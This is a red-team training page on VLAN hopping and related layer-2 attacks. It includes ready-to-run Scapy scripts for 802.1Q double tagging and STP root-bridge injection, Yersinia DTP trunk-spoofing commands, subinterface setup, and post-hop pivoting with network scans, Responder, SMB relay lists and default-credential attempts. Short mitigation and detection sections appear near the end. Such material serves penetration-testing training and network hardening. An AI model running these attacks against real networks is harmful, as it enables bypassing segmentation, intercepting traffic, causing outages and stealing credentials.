---
layout: training-page
title: "VLAN Hopping — Red Team Academy"
module: "Network Attacks"
tags:
  - vlan
  - 802.1q
  - dtp
  - network
  - layer2
page_key: "network-vlan-hopping"
render_with_liquid: false
---

# VLAN Hopping

VLAN hopping allows an attacker on one VLAN to send traffic to another VLAN that should be logically isolated, bypassing firewall rules and network segmentation. Two primary techniques: double tagging exploits how switches handle 802.1Q frames, and DTP spoofing tricks a switch into forming a trunk link that carries all VLANs.

## 802.1Q Primer

```
Access port  — carries traffic for a single VLAN; strips/adds tag
Trunk port   — carries tagged traffic for multiple VLANs
Native VLAN  — frames sent untagged on a trunk; default is VLAN 1

Double-tag attack exploits the native VLAN:
  Attacker is on VLAN 10 (native VLAN of the uplink trunk)
  Attacker sends frame with two 802.1Q tags: outer=VLAN10, inner=VLAN20
  First switch strips outer tag (native VLAN — untagged forwarding)
  Second switch sees inner tag (VLAN20) → forwards into VLAN20
  Traffic reaches VLAN20 from VLAN10
  NOTE: this is one-way only — replies don't return via this path
```

## Attack 1: 802.1Q Double Tagging

```bash
# Requirements:
# - Attacker is on the native VLAN of the trunk uplink
# - Target is on a different VLAN reachable through that trunk

# Craft double-tagged frame with Scapy
python3 << 'EOF'
from scapy.all import *

# Double-tagged packet: outer VLAN 10 (native), inner VLAN 20 (target)
packet = (
    Ether(dst="FF:FF:FF:FF:FF:FF") /
    Dot1Q(vlan=10) /          # outer tag — native VLAN, stripped by first switch
    Dot1Q(vlan=20) /          # inner tag — delivered to VLAN 20
    IP(dst="192.168.20.1") /
    ICMP()
)
sendp(packet, iface="eth0")
EOF

# With Yersinia
yersinia -I  # interactive mode
# Select 802.1Q → Launch attack → Send 802.1Q double encapsulated

# Check if you're on the native VLAN first:
# If your switch port is an access port on VLAN 1 and VLAN 1 is the native VLAN
# on trunk links → you're vulnerable to double-tag attacks toward other VLANs
```

## Attack 2: DTP Trunk Negotiation (Switch Spoofing)

```bash
# DTP (Dynamic Trunking Protocol) — Cisco proprietary
# If a switch port is in "dynamic auto" or "dynamic desirable" mode,
# it will negotiate a trunk with any device that requests one
# An attacker can impersonate a switch and negotiate a trunk port
# gaining access to ALL VLANs

# Yersinia — DTP attack
yersinia -I
# Select DTP → "Enabling trunk mode" attack

# Or using yersinia in CLI mode
yersinia dtp -attack 1 -interface eth0

# After trunk is established, configure a VLAN interface on attacker
modprobe 8021q
ip link add link eth0 name eth0.20 type vlan id 20
ip addr add 192.168.20.100/24 dev eth0.20
ip link set eth0.20 up

# Now you have direct access to VLAN 20
```

## Attack 3: VLAN Stacking with Scapy (Targeted Delivery)

```bash
# Craft custom packets for specific targets across VLANs
python3 << 'EOF'
from scapy.all import *

target_mac = "AA:BB:CC:DD:EE:FF"  # target MAC in VLAN 20

p = (Ether(dst=target_mac) /
     Dot1Q(vlan=10) /
     Dot1Q(vlan=20) /
     IP(src="192.168.10.50", dst="192.168.20.5") /
     TCP(dport=445) /
     Raw(load=b"\x00" * 20))

sendp(p, iface="eth0", count=5)
EOF
```

## Reconnaissance — Identify VLANs

```bash
# Sniff 802.1Q tagged frames to discover VLANs in use
tcpdump -i eth0 -e 'vlan'
# Look for: "vlan X" in output — reveals active VLAN IDs

# With tshark
tshark -i eth0 -Y "vlan" -T fields -e eth.src -e vlan.id

# CDP/LLDP — discover switch port and VLAN info
# Cisco Discovery Protocol frames reveal switch model, port, VLAN
tcpdump -i eth0 'ether proto 0x2000'  # CDP
tcpdump -i eth0 'ether proto 0x88cc'  # LLDP

# Parse CDP with Wireshark:
# Filter: cdp → reveals native VLAN, device capabilities, interface

# VTP (VLAN Trunking Protocol) — reveals all VLANs in domain
# tcpdump: ether dst 01:00:0c:cc:cc:cc
# Wireshark filter: vtp
```

## VLAN Interface Setup After Successful Hop

```bash
# Configure attacker to communicate on target VLAN

# Method 1: Linux 802.1Q subinterface
modprobe 8021q
ip link add link eth0 name eth0.vlan20 type vlan id 20
ip link set eth0.vlan20 up
dhclient eth0.vlan20  # get DHCP address from target VLAN

# Method 2: Manual IP
ip addr add 192.168.20.50/24 dev eth0.vlan20
ip route add 192.168.20.0/24 dev eth0.vlan20

# Verify connectivity to target VLAN
ping 192.168.20.1
nmap -sn 192.168.20.0/24
```

## Mitigations (for Report Findings)

```
Vulnerable configurations:
  - Native VLAN = VLAN 1 (default) on trunk links
  - DTP enabled on access ports ("dynamic auto" or "dynamic desirable")
  - No private VLANs (PVLANs) for isolation within a VLAN

Secure configurations:
  - Set native VLAN to an unused VLAN (not VLAN 1) on trunk links
  - Disable DTP: "switchport nonegotiate" on all access ports
  - Set access ports explicitly: "switchport mode access"
  - Prune VLANs from trunks to only what's needed
  - Enable Dynamic ARP Inspection (DAI) and DHCP snooping
```

## DTP Exploitation with Yersinia

```bash
# DTP (Dynamic Trunking Protocol) — Cisco proprietary trunking negotiation
# Switch ports in "dynamic auto" or "dynamic desirable" mode will negotiate
# a trunk with any device requesting one

# Verify DTP frames are being sent by the switch (passive check first)
tcpdump -i eth0 'ether dst 01:00:0c:cc:cc:cd' -v
# DTP uses multicast destination 01:00:0c:cc:cc:cd
# If you see DTP frames, the port is negotiable

# Yersinia — interactive DTP trunk negotiation
yersinia -I
# Navigate: Select protocol → DTP → Launch attack → "Enable trunking mode"
# This sends DTP Desirable frames to the switch
# Switch responds by forming a trunk → you now carry all VLANs

# Yersinia CLI mode (non-interactive)
yersinia dtp -attack 1 -interface eth0
# Attack type 1 = Sending DTP Desirable packets

# Verify trunk was established (DTP success indicator)
tcpdump -i eth0 'vlan' -c 20
# If you see tagged frames with various VLAN IDs → trunk is up

# After trunk established — enumerate available VLANs
tcpdump -i eth0 'ether dst 01:00:0c:cc:cc:cc' -v
# VTP advertisements contain full VLAN list for the domain

# Set up VLAN subinterfaces to access discovered VLANs
modprobe 8021q
for vlan_id in 10 20 30 40 50; do
    ip link add link eth0 name eth0.$vlan_id type vlan id $vlan_id
    ip link set eth0.$vlan_id up
    dhclient eth0.$vlan_id &
done
ip addr show  # Check which VLANs assigned DHCP addresses
```

## 802.1Q Double-Tagging Attack Mechanics

The double-tagging attack is one-directional — you can send frames into a target VLAN but cannot receive direct replies. Best used to trigger callbacks (reverse shells, DNS requests, HTTP fetches).

```bash
# Requirements for double-tagging to succeed:
# 1. Attacker is connected to an access port on the NATIVE VLAN of the trunk uplink
# 2. The switch does not strip double-tagged frames (most do not by default)
# 3. Native VLAN = VLAN 1 (Cisco default) or whatever the trunk native VLAN is

# Verify your VLAN (check what DHCP gives you — first octet range often indicates VLAN)
ip addr show eth0
# If 192.168.1.x → you may be in VLAN 1 (native VLAN)

# Step 1: Identify native VLAN of the trunk uplink
# Method A: CDP — reveals native VLAN in Cisco Discovery Protocol frames
tcpdump -i eth0 'ether proto 0x2000' -v 2>/dev/null | grep -i "native vlan\|vlan id"

# Method B: Observe untagged frames on the wire — untagged = native VLAN

# Step 2: Craft double-tagged packet with Scapy
python3 << 'EOF'
from scapy.all import *

# Replace with actual values
native_vlan = 1     # outer tag — stripped by first switch (your VLAN)
target_vlan = 20    # inner tag — delivered into target VLAN
target_ip   = "192.168.20.5"    # target in VLAN 20

# ICMP probe to verify reach
pkt = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    Dot1Q(vlan=native_vlan, type=0x8100) /
    Dot1Q(vlan=target_vlan) /
    IP(dst=target_ip, ttl=64) /
    ICMP()
)
sendp(pkt, iface="eth0", verbose=True)
EOF

# Step 3: Trigger reverse callback from target
# Since replies can't return via double-tagging, use techniques that
# initiate outbound connections FROM the target back to attacker:
# - Send double-tagged TCP SYN to port 80 → if target makes HTTP request → DNS resolves to attacker
# - ARP request to target_ip (ARP replies are broadcast → may reach you via switch flooding)
# - ICMP with spoofed source in target VLAN (tricky — use VLAN interface on attacker)

# Step 4: More reliable — use Yersinia for double encapsulation attack
yersinia -I
# 802.1Q protocol → "Send 802.1Q double encapsulated packet"
```

## STP (Spanning Tree Protocol) Attacks

STP prevents switching loops by electing a root bridge and blocking redundant links. An attacker injecting a superior BPDU becomes the root bridge, forcing all spanning tree traffic to flow through the attacker.

```bash
# WARNING: STP root injection can cause network outages
# Traffic re-converges through attacker → brief interruption → some switches
# may loop or experience outage during convergence. Use only when authorized.

# Check for STP traffic (passive — safe)
tcpdump -i eth0 'ether dst 01:80:c2:00:00:00' -v
# STP BPDUs use multicast 01:80:c2:00:00:00
# Reveals: current root bridge, root bridge priority, port states

# Yersinia STP attack — inject superior BPDU to become root bridge
yersinia -I
# STP → "Claiming root role"

# CLI mode
yersinia stp -attack 1 -interface eth0
# Attack 1 = sending CONF BPDU (claiming to be root)
# Attack 2 = sending TCN BPDU (topology change notification — causes MAC table flush)

# Scapy manual BPDU (superior root bridge claim)
python3 << 'EOF'
from scapy.all import *

# Craft a BPDU with lower priority than current root (lower = better in STP)
bpdu = (
    Ether(dst="01:80:c2:00:00:00", src="de:ad:be:ef:00:01") /
    LLC(dsap=0x42, ssap=0x42, ctrl=3) /
    STP(bpdutype=0,       # Configuration BPDU
        bpduflags=0,
        rootid=0x0001,    # Root bridge priority = 1 (very low — wins election)
        rootmac="de:ad:be:ef:00:01",
        pathcost=0,
        bridgeid=0x0001,
        bridgemac="de:ad:be:ef:00:01",
        portid=0x8001,
        age=0, maxage=20, hellotime=2, fwddelay=15)
)
sendp(bpdu, iface="eth0", loop=1, inter=2)
EOF

# Effect: other switches accept attacker as root → MITM on inter-switch traffic
# Attacker sees all traffic that traverses the core switch path
```

## Post-VLAN-Hop Pivot

Once you reach a target VLAN, treat it like a fresh network foothold.

```bash
# Immediate reconnaissance on new VLAN
# 1. Check what network you're in
ip addr show
# 2. Discover hosts in the new segment
nmap -sn 192.168.20.0/24
arp-scan --interface=eth0.20 192.168.20.0/24

# 3. Quick port scan of key targets
nmap -p 22,80,443,445,3389,8080 192.168.20.0/24 --open

# 4. Identify high-value targets
nmap --script smb-os-discovery -p 445 192.168.20.0/24  # Windows hosts
nmap --script ldap-rootdse -p 389 192.168.20.0/24       # Domain controllers

# 5. SMB relay targets in new VLAN
crackmapexec smb 192.168.20.0/24 --gen-relay-list /tmp/vlan20_relay.txt

# 6. Run Responder on new VLAN interface
responder -I eth0.20 -wr

# 7. Check for easy wins (default credentials, unpatched services)
nmap --script smb-vuln-ms17-010 -p 445 192.168.20.0/24
crackmapexec smb 192.168.20.0/24 -u administrator -p administrator
```

## Infrastructure for Persistent VLAN Access

```bash
# Once trunk is established via DTP, make it persistent

# 1. Create VLAN subinterfaces (survives interface up/down)
modprobe 8021q
echo "8021q" >> /etc/modules

# 2. Create persistent VLAN interfaces via /etc/network/interfaces (Debian/Ubuntu)
cat >> /etc/network/interfaces << 'EOF'
auto eth0.10
iface eth0.10 inet dhcp
    vlan-raw-device eth0

auto eth0.20
iface eth0.20 inet dhcp
    vlan-raw-device eth0
EOF

# 3. Route between VLANs through attacker (become router)
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# 4. Access VLAN 20 hosts from attacker tooling
# Just use the eth0.20 interface directly:
nmap -e eth0.20 192.168.20.0/24
crackmapexec smb 192.168.20.0/24 --interface eth0.20
```

## Detection Context

```
Detection controls relevant to VLAN attacks:

Port Security (limits MACs per port):
  - Blocks new MACs from appearing on access ports
  - Would flag a rogue device joining with a new MAC
  - Config: switchport port-security maximum 2

BPDU Guard (protects access ports from STP injection):
  - Disables port immediately if BPDU is received
  - Prevents STP root bridge attacks and rogue switches
  - Config: spanning-tree bpduguard enable (per port)
  - Config: spanning-tree portfast bpduguard default (globally)

Root Guard:
  - Prevents a port from becoming the root bridge path
  - Less disruptive than BPDU Guard (drops superior BPDUs, doesn't shut port)
  - Config: spanning-tree guard root

Dynamic ARP Inspection (DAI):
  - Validates ARP packets against DHCP snooping binding table
  - Blocks gratuitous ARP from non-DHCP-leased addresses
  - Makes ARP MITM much harder even after VLAN hop

Storm Control:
  - Rate-limits broadcast/multicast floods
  - Limits damage from STP topology changes or DHCP starvation

Disable DTP on access ports:
  - switchport nonegotiate
  - switchport mode access
  - Eliminates DTP trunk negotiation attack entirely
```

## Resources

- Yersinia — `github.com/tomac/yersinia`
- MITRE T1599 — Network Boundary Bridging — `attack.mitre.org/techniques/T1599/`
- Scapy documentation — `scapy.net`
- Cisco 802.1Q VLAN security guide — `cisco.com`
- IEEE 802.1Q specification — `ieee802.org`
